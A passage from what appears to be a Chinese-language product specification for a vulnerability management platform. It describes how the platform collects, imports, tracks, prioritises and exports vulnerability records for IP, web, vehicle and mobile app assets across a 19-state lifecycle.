离线文件中导入漏洞数据，这大大节省了手动录入的时间和减少了错误的可能性。</li><li>平台的灵活性体现在它能够与各种检测平台及工具对接，如二进制分析工具等，实现漏洞信息的快速展现和同步更新，确保了信息的准确性和实时性。</li><li>利用漏洞模板导入功能，用户可以通过模版快速导入包括漏洞ID、描述、等级、属性和影响资产等在内的漏洞信息，这个功能大大提高了漏洞信息管理的效率。</li><li>平台提供了高度自定义的功能，允许用户根据自己的需求自定义漏洞类型和属性名称及属性值。这种设计增加了平台的灵活性，使其能够适应不同组织的特定安全管理流程和政策。</li></ol><h5 id="技术实现内容-2"><a href="#技术实现内容-2" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="多种漏洞采集方式"><a href="#多种漏洞采集方式" class="headerlink" title="多种漏洞采集方式"></a>多种漏洞采集方式</h6><p>平台支持多种漏洞采集方式，包括：</p><p>漏洞扫描引擎的调度采集：可以通过定期调度漏洞扫描引擎来自动采集漏洞信息。</p><p>外部导入：允许从外部来源导入漏洞数据。</p><p>人工添加：用户可以手动添加漏洞信息，确保平台包含所有必要的漏洞记录。</p><p>系统支持多种漏洞采集方式。首先，漏扫引擎调度采集是主要方式之一，通过调度漏洞扫描引擎自动检测漏洞。其次，外部导入是指从其他系统或来源手动导入漏洞数据。最后，人工添加允许用户手动录入漏洞信息，可补充或修正已有数据，确保漏洞信息的全面性。</p><h6 id="第三方漏洞扫描引擎对接"><a href="#第三方漏洞扫描引擎对接" class="headerlink" title="第三方漏洞扫描引擎对接"></a>第三方漏洞扫描引擎对接</h6><p>平台支持与第三方漏洞扫描引擎对接，包括漏洞扫描厂商设备接入。这使得用户能够直接将第三方扫描结果整合到平台中，实现自动化漏洞识别和记录。</p><p>还支持从其他平台（如靶场平台、众测平台、安全检测平台等）接入漏洞数据，确保漏洞信息的全面性和准确性。</p><p>平台允许调度第三方漏洞扫描引擎，包括各种漏扫厂商设备接入，同时可以从外部平台（如靶场、众测平台）获取漏洞数据。这种对接机制能够提供更多元的漏洞来源，增强了漏洞数据的丰富性和全面性。</p><h6 id="二进制分析工具漏洞监控模块"><a href="#二进制分析工具漏洞监控模块" class="headerlink" title="二进制分析工具漏洞监控模块"></a>二进制分析工具漏洞监控模块</h6><p>平台与二进制分析工具对接，同步工具的漏洞信息，以确保平台及时获取和记录与二进制分析相关的漏洞数据。</p><p>系统可实现与二进制分析工具的对接，监控工具检测到的漏洞信息，并将其同步到漏洞管理平台。这种同步能够追踪工具检测到的最新漏洞，保持平台数据的及时性和准确性。</p><h6 id="手动录入漏洞信息"><a href="#手动录入漏洞信息" class="headerlink" title="手动录入漏洞信息"></a>手动录入漏洞信息</h6><p>用户可以通过界面手动录入漏洞信息，确保任何漏洞都能够被准确记录和跟踪。</p><p>用户可以通过漏洞管理界面手动录入漏洞信息，填写漏洞描述、发现来源、报告人等关键信息。这种手动添加方式使用户可以灵活地完善平台上的漏洞数据。</p><h6 id="漏洞基本信息展示"><a href="#漏洞基本信息展示" class="headerlink" title="漏洞基本信息展示"></a>漏洞基本信息展示</h6><p>平台提供了漏洞基本信息的展示，包括漏洞编号、漏洞描述、漏洞发现来源、漏洞报告人等详细信息。</p><p>支持漏洞基本信息的展示是平台的重要功能之一。用户可以方便地查看漏洞的各项重要信息，其中包括漏洞编号、详细描述、漏洞的发现来源以及报告人等重要信息。这种细致全面的信息呈现方式，有助于用户迅速了解漏洞的来源、性质和发现方式，为制定安全措施和解决方案提供了必要的参考依据。同时，展示漏洞报告人信息也有助于识别并感谢发现漏洞的贡献者，促进安全社区的合作和信息共享。通过这种展示方式，平台使得漏洞信息透明化，并且便于用户根据这些信息采取必要的安全补救措施，以确保系统和应用程序的安全性。</p><h6 id="IP和资产管理"><a href="#IP和资产管理" class="headerlink" title="IP和资产管理"></a>IP和资产管理</h6><p>用户可以通过界面人工添加IP、零部件资产、车联网系统漏洞，确保漏洞与相应资产关联。</p><p>平台支持通过用户友好的界面实现对IP、零部件资产以及车联网系统漏洞的人工添加。这项功能为用户提供了一种直观便捷的方式，能够快速而准确地将特定的IP地址、各类零部件资产以及车联网系统漏洞添加到平台中，以便进行针对性的管理和监控。通过界面人工添加这些信息，用户可以定义和标记具体的漏洞点，这对于漏洞的管理和修复非常关键。</p><p>针对IP地址的添加，用户可以直接在平台界面上输入或选择要添加的IP地址，确保系统对相关网络节点的全面覆盖。对于零部件资产，用户可以透过界面添加各种设备或部件的详细信息，使得平台可以对这些资产进行有效的追踪和监管。至于车联网系统漏洞，用户同样可以通过界面添加相关漏洞信息，使平台能够及时掌握车联网系统的安全状况，并进行相应的安全措施。</p><h6 id="导入漏洞扫描器离线文件"><a href="#导入漏洞扫描器离线文件" class="headerlink" title="导入漏洞扫描器离线文件"></a>导入漏洞扫描器离线文件</h6><p>平台支持通过导入漏洞扫描器生成的离线文件的方式，采集漏洞数据。这包括.Nessus、XML、Excel等格式的文件。</p><p>平台支持一种便捷的方式来采集漏洞信息，即通过导入漏洞扫描器离线文件的方式进行漏洞信息的整合。这种方式允许用户将包括.Nessus、XML、Excel等格式的离线文件导入到平台中，以快速有效地收集和整理漏洞信息。</p><p>用户可以将相应格式的离线文件上传至平台，系统将会对文件进行解析和处理，将其中的漏洞信息提取出来并整合到平台的漏洞数据库中。这样的功能使得平台能够从不同来源的漏洞扫描器产生的文件中获取漏洞数据，确保了漏洞信息的全面性和多样性。同时，这也大大简化了漏洞信息的汇总流程，为用户提供了高效且便捷的数据整合方式。</p><p>通过支持这种导入离线文件的功能，平台能够帮助用户快速建立全面的漏洞信息库，提升了对系统安全状况的全面监控和管理能力。</p><h6 id="与检测平台及工具对接"><a href="#与检测平台及工具对接" class="headerlink" title="与检测平台及工具对接"></a>与检测平台及工具对接</h6><p>平台具备与检测平台和工具对接的能力（如二进制分析工具等），以展现和记录不同来源的漏洞信息。</p><p>平台支持与各类检测平台及工具对接，包括但不限于二进制分析工具，能够展现来自这些工具的详尽漏洞信息。</p><p>这种对接功能使得平台能够获取多种检测平台和工具所提供的漏洞信息，并将这些信息整合展现在一个统一的界面上。这样的集成显示机制帮助用户在一个平台上便捷地查看来自不同来源的漏洞信息，提供了一个全面了解系统安全状况的途径。</p><p>通过与检测平台及工具对接，平台能够呈现多样化的漏洞信息，包括漏洞的类型、级别、发现时间以及影响范围等重要细节。这种全面展现漏洞信息的方式，为用户提供了更深入的安全诊断视角，有助于用户全面了解系统的安全情况并及时采取必要的安全措施。</p><h6 id="漏洞模板导入"><a href="#漏洞模板导入" class="headerlink" title="漏洞模板导入"></a>漏洞模板导入</h6><p>用户可以通过漏洞模板导入漏洞信息，自定义漏洞ID、漏洞描述、漏洞等级、漏洞属性以及漏洞影响资产等信息。</p><p>平台支持通过漏洞模板导入漏洞信息，这种导入方式不受限于漏洞ID、漏洞描述、漏洞等级、漏洞属性以及漏洞影响资产等关键要素。</p><p>用户可以利用漏洞模板功能，按照自定义的标准导入漏洞信息。这种高度灵活的方式允许用户根据实际需求，导入各类漏洞信息，而不受特定字段或格式的限制。通过这种方式，用户可以根据自身系统或业务的特点，灵活定义并录入漏洞信息，确保了漏洞信息记录的全面性和准确性。</p><p>此外，支持漏洞模板导入也提供了方便的数据整合途径。用户可以在保持数据的完整性的同时，按照系统要求将漏洞信息集中导入到平台中，为后续的安全分析和决策提供了可靠的数据基础。这种灵活且全面的导入方式，有助于平台用户更好地管理和维护漏洞信息。</p><h6 id="漏洞类型和属性自定义"><a href="#漏洞类型和属性自定义" class="headerlink" title="漏洞类型和属性自定义"></a>漏洞类型和属性自定义</h6><p>平台允许用户自定义漏洞类型和属性的名称和值，以满足特定的需求和标准。</p><p>平台支持用户自定义漏洞类型，并且允许用户自由定义漏洞属性名称和属性值。</p><p>这种功能允许用户根据特定需求或特定环境，自行设定漏洞类型，例如网络漏洞、应用程序漏洞、操作系统漏洞等等。同时，用户可以根据实际情况定义漏洞属性名称，比如严重性、影响范围、修复建议等等，以便更全面地描述和区分不同漏洞的特性。此外，用户还可以为这些属性设定特定的属性值，用于更具体地描述每个漏洞的具体特征或情况。</p><p>这种自定义功能为用户提供了高度灵活性和个性化定制的空间，使其能够根据实际需求或特定场景，标识和管理各类漏洞。通过自定义漏洞类型和属性，用户可以更清晰地理解和描述系统中存在的安全问题，并更有针对性地采取相应的安全措施和修复方案。</p><h4 id="漏洞运维管理"><a href="#漏洞运维管理" class="headerlink" title="漏洞运维管理"></a>漏洞运维管理</h4><p>全面生命周期管理：支持安全对象的全生命周期管理，从漏洞发现到解决，持续跟踪漏洞处置任务以及处置情况，确保漏洞不被忽视。</p><p>数据同步与关联：可以将不同来源的漏洞数据同步到平台，并与资产信息关联，提供完整视图。</p><p>高效查询与排序：提供多维度的查询和排序功能，接受安全运营平台的查询指令并反馈对应的漏洞信息用户可以按时间、等级等条件快速定位漏洞以及查看漏洞列表。</p><p>详细漏洞信息管理：提供漏洞详细信息，包括名称、资产关联、解决方案等。</p><p>多维度检索：用户可以根据漏洞名称、资产IP、状态等多个维度进行检索和管理符合条件的漏洞。</p><p>多种操作选项：用户可以对漏洞执行多种操作，包括已消除、暂不消除、误报等，以适应不同情况。</p><p>数据导出功能：支持导出漏洞数据，以便进一步分析和报告生成。</p><p>漏洞分析信息管理：提供漏洞分析信息，包括原因、相关项、责任部门等，有助于深入了解漏洞。</p><p>多维度管理：支持IP视角、网站资产漏洞、车辆漏洞信息、移动APP等多个维度的管理和分析，包括漏洞影响URL、漏洞名称、漏洞级别、漏洞类型、移动版本号等纬度。</p><p>全面的漏洞状态：涵盖漏洞的多种状态，确保每个漏洞都有明确的处理状态，包括新增、开放、重现、误报、忽略、接受、缓解、消除、待修复、修复完成、无法修复、超期未修复、待验证、验证成功、验证失败、待复测、复测通过、复测失败、待处理等19个状态。</p><p>漏洞优先级排序：基于漏洞的优先级模型，帮助用户根据风险程度进行优先处理。</p><p>时间线管理：跟踪漏洞的时间线，包括发现时间、处理时间等，帮助了解漏洞演化情况。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/54052a1476517fd198b1aa0cd657d678.png"></p><p>漏洞运维界面</p><h5 id="功能实施方案-5"><a href="#功能实施方案-5" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>平台为安全对象提供了全生命周期的漏洞管理服务。从漏洞的发现、评估、修复到最终的验证，每个环节都被系统地跟踪和记录。平台不仅自动跟踪漏洞处置任务，还能详细记录处置情况，支持生成详尽的漏洞处理报告。这种持续的监控和更新机制确保了安全团队可以实时掌握每个漏洞的处理进度和状态，从而及时做出响应。</p><p>平台能够同步从各种安全测试环境，如靶场平台、众测平台、测试平台等其他方式获取的最新漏洞信息。通过与这些平台的集成，新发现的漏洞能够迅速与现有的安全运营平台中的资产信息相关联，确保了漏洞信息的时效性和准确性。这种同步机制显著提高了安全运营的效率，并加强了对资产的保护。</p><p>平台提供了漏洞信息查询及同步接口，能够响应安全运营平台的查询指令，并实时反馈相应的漏洞信息。这种接口服务使得漏洞信息的获取更加灵活和方便，支持第三方系统和工具的集成，以便使用不同的安全解决方案来查询和处理漏洞信息。</p><p>平台支持对漏洞列表进行时间和等级排序查看。用户可以根据漏洞发现的时间或者漏洞的严重程度来排序，这有助于安全团队优先处理最紧急或最严重的漏洞，提高了风险管理的效率。</p><p>平台的漏洞详细面板为用户提供了全面的漏洞信息展示，包括漏洞名称、所属资产、解决方案等关键信息。这些详细的漏洞数据有助于用户深入了解每个漏洞的具体情况，制定更加针对性和有效的修复计划。</p><p>平台支持通过漏洞名称、资产IP、发现时间、状态、等级等多个维度来检索符合条件的漏洞。这种多维度的搜索功能使得漏洞的跟踪和管理变得更加高效和精准。</p><p>平台允许用户对漏洞进行多种操作，如标记为已消除、暂不消除、误报等。这种灵活的漏洞处理方式让用户可以根据实际情况和安全策略来对漏洞进行分类处理，从而更好地管理和控制安全风险。</p><p>用户可以方便地从平台中导出漏洞列表为Excel文件，支持选中特定漏洞的导出或全部漏洞的批量导出。这个功能非常适合需要进行漏洞报告或审计的情况，使得数据的分享和分析变得更加便捷。</p><p>平台不仅展示了基础的漏洞信息，还提供了深入的漏洞分析内容，包括但不限于漏洞原因、漏洞相关项及零部件信息、责任内部归口部门等。这些分析信息有助于用户理解漏洞产生的背景，以及漏洞的潜在影响，从而采取更加有效的防范和修复措施。</p><p>平台不仅展示了基础的漏洞信息，还提供了深入的漏洞分析内容，包括但不限于漏洞原因、漏洞相关项及零部件信息、责任内部归口部门等。这些分析信息有助于用户理解漏洞产生的背景，以及漏洞的潜在影响，从而采取更加有效的防范和修复措施。</p><p>平台支持从IP视角进行漏洞的管理和分析，提供了包括漏洞名称、级别、类型、CWE编号、CVE编号、POC方式、采集途径等多个维度的信息。这种视角的支持有助于用户从网络层面全面了解和评估漏洞的风险，制定相应的安全策略。</p><p>对于网站资产，平台提供了全面的漏洞管理和分析功能，包括影响的URL、漏洞名称、级别、类型、CWE编号、POC方式、WEB应用等多个维度。这有助于用户针对性地保护网站资产，防范潜在的网络攻击。</p><p>支持多维度展现车辆漏洞信息，包括：漏洞数量、漏洞名称、漏洞级别、关联零部件、相关车型等多个维度；功能截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fb627836267ff9b6a132e397db05070f.png"></p><p>支持移动APP的多视角管理和分析，包括漏洞影响URL、漏洞名称、漏洞级别、漏洞类型、移动版本号等纬度；功能截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9a9d60bcdad3bd76f67907f2d920d0ea.png"></p><p>平台支持漏洞全生命周期管理，具备一个完整的漏洞管理模型。这个模型满足了从漏洞发现到修复的各个阶段的不同风险控制措施和管理力度的需求，确保了漏洞管理的全面性和持续性。</p><p>平台提供了一套功能全面的漏洞状态分类体系，以确保安全团队能够对每个发现的漏洞进行精确的跟踪和管理。这个体系涵盖了19个不同的漏洞状态，每个状态都对应漏洞处理过程中的一个具体阶段，从而为安全团队提供了一个清晰的工作指引和状态监控框架。首先是“新增”状态，表示漏洞刚刚被发现并记录进系统。接着是“开放”状态，说明漏洞已经被确认并且正在等待被分配给相应的处理小组。如果漏洞在后续的测试中再次出现，则会被标记为“重现”。与此同时，如果经过评估，某个漏洞被认定为误报，则会被归类为“误报”状态。在某些情况下，漏洞可能会被判断为不影响系统安全或优先级较低，那么它可能会被标记为“忽略”。而对于那些已经确认但选择不立即修复的漏洞，则会被标记为“接受”。对于那些已经实施了临时解决措施的漏洞，它们的状态将被设置为“缓解”。而当漏洞被彻底解决，不再对系统构成威胁时，则会被标记为“消除”。在漏洞修复过程中，还有几个关键的状态需要注意。当漏洞正在等待被修复时，它会被标记为“待修复”。一旦修复措施被实施，状态将更新为“修复完成”。对于那些由于技术或其他限制而无法修复的漏洞，它们将被归类为“无法修复”。如果漏洞超过了预定的修复时间仍未得到处理，它将被标记为“超期未修复”。在漏洞修复后，验证步骤很重要。因此，平台设置了“待验证”状态，用于标记那些待确认修复效果的漏洞。如果验证成功，漏洞状态将更新为“验证成功”，反之则为“验证失败”。在某些情况下，漏洞可能需要进一步的复测，这时它会被标记为“待复测”。复测通过后，状态将变更为“复测通过”，如果复测未能通过，则会被标记为“复测失败”。最后，对于那些需要进一步处理的漏洞，它们会被归类到“待处理”状态，等待进一步的决策或行动。通过这样详尽的漏洞状态分类，平台确保了安全团队能够对每个漏洞的处理进度保持清晰的了解，并能够及时采取相应的措施。这不仅提高了漏洞处理的效率，也确保了安全风险得到了妥善的控制和降低。</p><p>具备漏洞优先级排序模型，支持漏洞与利用情报、网关防御规则自动关联，进行漏洞优先级排序</p><p>支持漏洞时间线管理，从漏洞公布时间、不同来源POC公布时间、Snort IPS规则公布时间、资产发现时间、漏洞发现时间、漏洞生命周期状态的跟踪，提炼考核指标。</p><h5 id="技术实现内容-3"><a href="#技术实现内容-3" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="漏洞生命周期管理"><a href="#漏洞生命周期管理" class="headerlink" title="漏洞生命周期管理"></a>漏洞生命周期管理</h6><p>平台支持对安全对象的整个生命周期的漏洞管理工作。这包括漏洞的发现、记录、报告、修复、验证和处置等环节，确保漏洞得到全面而持续的关注和处理。具备漏洞全生命周期管理模型。满足不同的风险控制措施和力度的管理需求。</p><p>平台支持对安全对象整个生命周期的漏洞管理工作，并能够持续跟踪漏洞处置任务和处置情况。</p><p>这种功能使得平台能够全面管理漏洞的发现、跟踪和解决过程，包括漏洞的发现、报告、分析、确认、解决和验证。平台可以帮助用户全面了解漏洞处置的整个过程，确保漏洞处置工作能够及时、有效地展开并得到妥善处理。</p><p>通过持续跟踪漏洞处置任务，平台可以帮助用户实时监控漏洞的处理进度和状态。同时，平台还能提供漏洞处置情况的记录和报告，使用户能够清晰地了解每个漏洞的处理情况，包括处置的时间、方式、结果等信息。这种持续跟踪和记录的机制，有助于用户全面了解漏洞管理工作的进展情况，及时调整处置策略并保证漏洞得到有效解决，最大程度地提升系统的安全性和稳定性。</p><h6 id="同步漏洞数据"><a href="#同步漏洞数据" class="headerlink" title="同步漏洞数据"></a>同步漏洞数据</h6><p>支持从不同来源，如靶场平台、众测平台、测试平台以及其他方式获取的最新漏洞数据同步到安全运营平台，并与资产信息进行关联。这确保了漏洞信息的一致性和准确性。</p><p>平台支持同步来自靶场平台、众测平台、测试平台等多种渠道获得的最新漏洞信息，并将其与安全运营平台的资产信息关联起来。</p><p>这项功能使得平台能够不断地更新漏洞信息，将最新的漏洞数据从多种渠道同步到安全运营平台，并与已有的资产信息进行关联。这种同步操作可以帮助用户全面了解系统和资产面临的最新安全威胁，及时识别和应对新出现的漏洞问题。</p><p>通过与靶场、众测、测试等平台的信息同步，平台可以在第一时间获知最新的漏洞情报。随后，它将这些信息与已有的资产信息进行关联，以便用户能够更加直观地了解哪些资产可能受到哪些最新漏洞的威胁。这种关联操作有助于提高漏洞信息的全面性和及时性，并为用户提供及时更新的安全风险评估，从而更有效地制定应对策略和保障系统安全。</p><h6 id="漏洞信息查询和同步接口"><a href="#漏洞信息查询和同步接口" class="headerlink" title="漏洞信息查询和同步接口"></a>漏洞信息查询和同步接口</h6><p>提供漏洞信息查询和同步接口，允许安全运营平台向漏洞管理平台发出查询指令，并接收漏洞信息的反馈。</p><p>平台支持提供漏洞信息查询及同步接口，能够接收安全运营平台发送的查询指令，并反馈对应的漏洞信息。</p><p>这种接口功能使得安全运营平台能够向漏洞管理平台发出查询请求，以获取特定漏洞信息。漏洞管理平台接收到查询指令后，通过相应的接口机制，将请求的漏洞信息快速准确地反馈给安全运营平台。这样的查询和反馈机制，为用户提供了便捷、高效地获取漏洞信息的途径。</p><p>通过提供这样的接口，安全运营平台可以在需要时随时向漏洞管理平台获取特定漏洞的详细信息，无需直接进入漏洞管理平台的界面，实现了信息的快速交换和共享。这种接口功能有助于加强不同系统之间的信息互通，提高了漏洞信息的可用性和共享性，为安全运营平台提供了更灵活和便捷的漏洞信息获取途径。</p><h6 id="漏洞列表管理"><a href="#漏洞列表管理" class="headerlink" title="漏洞列表管理"></a>漏洞列表管理</h6><p>支持对漏洞列表进行灵活的时间和等级排序，以便用户更容易查看和筛选漏洞信息。</p><p>平台支持对漏洞列表进行时间和等级排序，使用户能够根据时间或漏洞等级的优先级对漏洞信息进行排序查看。</p><p>通过时间排序，用户可以按照漏洞被发现或报告的时间顺序，查看最新的漏洞信息或优先关注最近出现的安全问题。这种按时间排序的功能能够帮助用户迅速定位和处理最新的安全威胁，保持对系统安全状况的及时了解。</p><p>通过等级排序，用户可以根据漏洞的危害等级或重要性进行排序，有助于用户首先处理那些危害较大或紧急程度较高的漏洞问题。这种排序方式可以帮助用户合理安排漏洞处理的优先级，更有效地保护系统安全。</p><p>这种支持排序查看漏洞列表的功能，为用户提供了更灵活、更便捷的漏洞信息管理方式，有助于用户快速了解漏洞信息的重要性和紧急程度，更有效地制定安全措施和漏洞处理策略。</p><h6 id="漏洞详细信息查看"><a href="#漏洞详细信息查看" class="headerlink" title="漏洞详细信息查看"></a>漏洞详细信息查看</h6><p>用户可以查看漏洞的详细信息面板，包括漏洞名称、所属资产、解决方案等关键信息，以便更深入地了解每个漏洞。</p><p>平台支持查看漏洞的详细面板，提供丰富的漏洞信息，包括漏洞名称、所属资产、解决方案等重要信息。</p><p>在漏洞详细面板中，用户可以查看漏洞的具体名称，以便明确了解漏洞类型和特征。同时，漏洞所属的资产信息也会被清晰列出，帮助用户准确定位哪些资产受到了漏洞的威胁。</p><p>漏洞详细面板会提供解决方案等相关信息，为用户提供针对该漏洞的解决建议或处理方法。这些解决方案能够帮助用户更快速地理解漏洞的危害性，并提供有效的应对措施，有助于用户更及时地采取必要的安全措施，保障系统的安全性。</p><p>通过漏洞详细面板，用户可以全面了解每个漏洞的具体情况，更好地了解其对系统的影响，并根据提供的解决方案采取相应的措施，从而更有效地管理和维护系统的安全。</p><h6 id="漏洞消除操作"><a href="#漏洞消除操作" class="headerlink" title="漏洞消除操作"></a>漏洞消除操作</h6><p>系统可以对漏洞进行已消除、暂不消除、误报操作。</p><p>已消除： 用户可以将已经解决或消除的漏洞标记为已消除状态。这种操作有助于用户追踪漏洞处置过程，确保漏洞已经得到妥善解决，同时也有助于对系统的安全性进行评估。</p><p>暂不消除： 用户在某些情况下可能暂时不处理某个漏洞，可以将漏洞标记为暂不消除状态。这有助于用户对漏洞处理的优先级进行合理安排，暂时放置不紧急的漏洞处理工作。</p><p>误报： 用户发现某个被误报的漏洞，可以将其标记为误报。这项操作有助于清除不准确的漏洞信息，确保漏洞信息的准确性和可信度。</p><h6 id="漏洞检索和筛选"><a href="#漏洞检索和筛选" class="headerlink" title="漏洞检索和筛选"></a>漏洞检索和筛选</h6><p>支持通过不同维度，如漏洞名称、资产IP、发现时间、状态、等级等，对漏洞进行检索和筛选，以快速找到符合条件的漏洞。</p><p>平台支持通过多种维度进行检索，包括漏洞名称、资产IP、发现时间、状态和等级等，来检索符合条件的漏洞信息。</p><p>通过漏洞名称进行检索，用户能够快速定位特定名称或关键词相关的漏洞信息。资产IP维度的检索使用户能够查找与特定IP地址相关联的漏洞。发现时间的检索允许用户根据漏洞被发现的具体时间段来筛选漏洞。状态维度的检索可帮助用户查找特定状态下的漏洞，例如已解决或未解决的漏洞。此外，等级维度的检索能够让用户根据漏洞的严重程度或等级来搜索漏洞。</p><h6 id="漏洞状态管理"><a href="#漏洞状态管理" class="headerlink" title="漏洞状态管理"></a>漏洞状态管理</h6><p>提供多种漏洞状态，包括但不限于新增、开放、重现、误报、忽略、接受、缓解、消除、待修复、修复完成、无法修复、超期未修复、待验证、验证成功、验证失败、待复测、复测通过、复测失败、待处理等19个状态。用户可以根据漏洞的不同状态进行相应的操作。</p><p>这些操作能够帮助用户更好地跟踪和管理漏洞处置过程，根据实际情况对漏洞进行合理的处理，有针对性地制定解决方案，并保证漏洞信息的准确性和系统安全性。</p><h6 id="漏洞导出"><a href="#漏洞导出" class="headerlink" title="漏洞导出"></a>漏洞导出</h6><p>用户可以选择导出列表中选中的漏洞或全部漏洞为Excel文件，以便进行进一步的分析和报告。</p><p>平台支持对列表中选中的漏洞或全部漏洞进行导出，生成Excel文件的功能。</p><p>用户可以根据需要，在漏洞列表中选择特定的漏洞或勾选全部漏洞，然后通过平台提供的导出功能，将选中的漏洞信息导出为Excel文件。这样的操作允许用户将所需的漏洞信息导出到Excel表格中，便于进行进一步的分析、备份或共享。</p><p>导出的Excel文件将包含选中漏洞的详细信息，例如漏洞名称、资产信息、发现时间、状态、等级等相关数据。这种导出功能使用户能够更加灵活地利用漏洞信息，并便于在本地进行处理、整理或共享，有助于对漏洞信息进行更全面、深入的分析和管理。</p><h6 id="漏洞分析信息"><a href="#漏洞分析信息" class="headerlink" title="漏洞分析信息"></a>漏洞分析信息</h6><p>平台支持展示漏洞分析信息，包括漏洞原因、漏洞相关项及零部件信息、责任内部归口部门等详细内容，以帮助用户全面了解漏洞的背景和影响。</p><p>漏洞原因： 平台提供漏洞分析信息，详细描述漏洞产生的原因。这包括对漏洞背后的技术原理、系统缺陷或程序逻辑问题的解释，有助于用户更全面地理解漏洞产生的根本原因。</p><p>漏洞相关项及零部件信息： 平台展示与漏洞相关的其他测试或零部件信息，可能涉及的软硬件组件、版本信息、依赖项等内容。这种信息有助于用户全面了解漏洞的影响范围和关联项，有助于更全面地定位和解决漏洞。</p><p>责任内部归口部门： 平台能够指明漏洞解决的内部归口部门，即哪个部门或团队负责解决该漏洞。这种信息有助于有效分工和协作，确保漏洞能够得到及时且有效地解决。</p><h6 id="多视角多维度漏洞管理（网络资产、移动APP）"><a href="#多视角多维度漏洞管理（网络资产、移动APP）" class="headerlink" title="多视角多维度漏洞管理（网络资产、移动APP）"></a>多视角多维度漏洞管理（网络资产、移动APP）</h6><p>支持IP视角和网站资产视角的漏洞管理和分析，用户可以查看漏洞数量、漏洞名称、漏洞级别、漏洞类型、CWE编号、CVE编号、POC方式、采集途径、WEB应用等不同维度的漏洞信息。</p><p>漏洞名称：提供漏洞的具体名称，有助于用户快速识别和了解漏洞的特征。</p><p>漏洞级别：展示漏洞的严重程度或危害级别，帮助用户评估漏洞的优先处理程度。</p><p>漏洞类型：包括诸如网络漏洞、应用程序漏洞、系统漏洞等分类，帮助用户了解漏洞的性质和类型。</p><p>CWE编号和CVE编号： 提供漏洞对应的CWE（常见弱点枚举）编号和CVE（通用漏洞披露）编号，有助于对漏洞进行更准确的标识和追踪。</p><p>POC方式：提供关于漏洞利用或验证的POC（证明概念）方式，有助于用户更全面地了解漏洞的利用方式和影响。</p><p>采集途径：指明漏洞信息的来源或采集方式，包括扫描器、靶场、安全测试等，帮助用户了解漏洞信息的收集来源。</p><p>支持移动APP的多视角管理和分析，包括漏洞影响URL、漏洞名称、漏洞级别、漏洞类型、移动版本号等纬度。</p><p>漏洞影响URL：提供漏洞影响的URL或相关链接，有助于识别和定位漏洞影响的具体网络资源。</p><p>漏洞名称：显示漏洞的名称或描述，帮助用户迅速理解漏洞的特征和影响。</p><p>漏洞级别：展示漏洞的严重程度或风险级别，帮助用户判断漏洞对移动应用安全性的威胁程度。</p><p>漏洞类型：包括诸如认证漏洞、数据泄露、权限问题等移动应用漏洞的分类，有助于用户了解漏洞的性质和类型。</p><p>移动版本号：显示移动应用程序的版本信息，有助于用户了解哪些版本受到了漏洞影响或哪些版本已经修复了该漏洞。</p><p>产品功能截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9a9d60bcdad3bd76f67907f2d920d0ea.png"></p><h6 id="漏洞全生命周期管理"><a href="#漏洞全生命周期管理" class="headerlink" title="漏洞全生命周期管理"></a>漏洞全生命周期管理</h6><p>提供漏洞全生命周期管理模型，满足不同的风险控制措施和力度的管理需求。</p><p>漏洞全生命周期管理模型旨在实现漏洞管理的全面覆盖。该模型涵盖了漏洞的完整生命周期，从漏洞发现到解决，再到最终的验证和报告。在此过程中，系统支持多种来源的漏洞信息收集，涵盖了不同的发现途径和严重性评估。处理阶段包括漏洞解决方案的制定和执行，以及对处理过程的跟踪和记录。此外，漏洞的有效验证和最终的报告也是该模型中的重要环节。这个模型有助于系统管理员和安全团队全面了解、处理和解决各类漏洞，以最大程度地减少系统面临的安全风险。</p><h6 id="多维度展现车辆漏洞信息"><a href="#多维度展现车辆漏洞信息" class="headerlink" title="多维度展现车辆漏洞信息"></a>多维度展现车辆漏洞信息</h6><p>车辆漏洞信息展示支持多维度展示，包括了：漏洞数量、漏洞名称、漏洞级别、关联零部件、相关车型等多个维度。</p><p>漏洞列表： 显示所有漏洞信息，包括漏洞名称、漏洞级别、关联零部件、相关车型等。</p><p>车型关联信息： 列出同一漏洞可能存在的相关车型列表，以便用户了解其他受影响的车辆。</p><p>产品截图如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a49e7d5f873e47d3f45e3fdf8b582bc2.png" alt="企业微信截图_17035233441771"></p><h6 id="漏洞优先级排序"><a href="#漏洞优先级排序" class="headerlink" title="漏洞优先级排序"></a>漏洞优先级排序</h6><p>具备漏洞优先级排序模型，支持漏洞与利用情报、网关防御规则自动关联，进行漏洞优先级排序，确保高风险漏洞得到优先处理。</p><p>对于漏洞优先级排序模型，系统支持将漏洞与利用情报和网关防御规则自动关联，以确保高风险漏洞得到优先处理。</p><p>该排序模型结合了多方面的信息，包括漏洞的严重性评估、已知的利用情报和网关防御规则。系统可以自动分析漏洞的严重性、已知的攻击利用情报、以及可能的防御规则，并根据这些信息为漏洞赋予相应的优先级。</p><p>通过这种模型，高风险漏洞将会被自动识别和标记为优先处理的对象。利用已知的攻击情报和网关防御规则，系统可以及时辨识和定位可能被利用的漏洞，确保在安全风险最高的情况下，系统管理员能够优先处理这些漏洞。</p><p>这个排序模型的主要目标是使安全团队能够更有效地分配资源，首先处理可能造成最严重后果的漏洞，从而最大程度地减少系统面临的潜在风险。</p><h6 id="丰富的漏洞状态"><a href="#丰富的漏洞状态" class="headerlink" 